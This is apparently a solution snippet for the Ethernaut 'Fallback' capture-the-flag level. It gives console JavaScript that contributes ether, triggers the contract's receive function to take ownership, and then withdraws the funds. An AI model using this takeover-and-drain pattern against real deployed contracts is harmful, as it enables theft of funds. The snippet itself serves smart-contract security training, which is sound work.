// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x4D9C662C72070325F42096d0e479ad5a2D398276

// solution
await contract.contribute.sendTransaction({ value: toWei('0.0001') });
// when sending eth to a contract, the "fallback function" is called if none of the other functions match the call (receive in this case)
await contract.sendTransaction({ value: toWei('0.0001') });
await contract.withdraw();